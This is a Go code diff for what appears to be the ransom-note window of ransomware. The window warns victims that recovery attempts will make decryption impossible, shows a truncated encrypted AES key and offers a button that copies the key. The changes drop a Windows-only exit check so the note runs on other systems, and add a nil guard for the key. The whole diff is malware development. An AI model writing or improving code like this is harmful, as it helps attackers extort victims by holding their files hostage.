@@ -3,7 +3,6 @@ package main
 import (
 	"fmt"
 	"os"
-	"runtime"
 
 	gui "github.com/gen2brain/raylib-go/raygui"
 	rl "github.com/gen2brain/raylib-go/raylib"
@@ -22,10 +21,6 @@ func main() {
 		showSuccessMessageBox bool   = false
 		showFailMessageBox    bool   = false
 	)
-
-	if runtime.GOOS != "windows" {
-		os.Exit(1)
-	}
 
 	rl.SetTraceLogLevel(rl.LogWarning)
 	rl.InitWindow(750, 600, "IMPORTANT")
@@ -68,7 +63,9 @@ func main() {
 		rl.DrawText("the cipher and decryption will be impossible.", 40, 385, 20, rl.DarkGray)
 		rl.DrawText("2. Trying to recover with any software can also break the cipher", 25, 415, 20, rl.DarkGray)
 		rl.DrawText("and file recovery will become a problem.", 40, 445, 20, rl.DarkGray)
-		rl.DrawText("key: "+string(aeskeyEncrypted)[:13]+"...", 40, 485, 20, rl.DarkGray)
+		if aeskeyEncrypted != nil {
+			rl.DrawText("key: "+string(aeskeyEncrypted)[:13]+"...", 40, 485, 20, rl.DarkGray)
+		}
 
 		if gui.Button(rl.Rectangle{X: 280, Y: 485, Width: 25, Height: 25}, gui.IconText(gui.ICON_FILE_COPY, "")) {
 			clipboard.Write(clipboard.FmtText, aeskeyEncrypted)
